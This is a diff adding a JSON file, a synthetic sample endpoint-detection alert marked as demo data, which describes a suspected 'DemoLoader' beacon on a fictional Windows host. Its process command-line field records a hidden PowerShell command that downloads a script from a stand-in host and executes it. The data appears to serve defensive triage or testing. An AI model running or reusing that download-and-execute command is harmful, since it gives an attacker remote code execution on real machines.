@@ -1,0 +1,42 @@
+{
+  "demo": true,
+  "label": "DEMO DATA. Synthetic sample alert. Not a real alert, host, person or organisation.",
+  "alert_id": "DEMO-EDR-0001",
+  "product": "Example EDR (fictional)",
+  "title": "Suspected beacon from DemoLoader after a PowerShell download",
+  "detected_at": "2026-10-17T09:12:00+11:00",
+  "category": "beacon",
+  "malware_name": "DemoLoader",
+  "vendor_severity": "high",
+  "host": {
+    "hostname": "WS-DEMO-042",
+    "ip": "192.0.2.10",
+    "os": "Windows 11 23H2"
+  },
+  "user": "demo.user@example.com",
+  "process": {
+    "name": "powershell.exe",
+    "command_line": "powershell.exe -nop -w hidden -c iwr https://update.example.net/agent/setup.ps1 -UseBasicParsing | iex",
+    "parent": "outlook.exe"
+  },
+  "file": {
+    "path": "C:\\Users\\demo.user\\AppData\\Local\\Temp\\setup.ps1",
+    "sha256": "80a67057fca09654d9e3c87207428bea1ef73ffd9ecd6ffddaf8964ecccc28b7"
+  },
+  "network": [
+    {
+      "direction": "outbound",
+      "dst_domain": "update.example.net",
+      "dst_ip": "203.0.113.45",
+      "dst_port": 443,
+      "url": "https://update.example.net/agent/setup.ps1"
+    },
+    {
+      "direction": "outbound",
+      "dst_ip": "203.0.113.45",
+      "dst_port": 443,
+      "note": "Repeated HTTPS connections every 60 seconds"
+    }
+  ],
+  "personal_information_on_host": "unknown"
+}
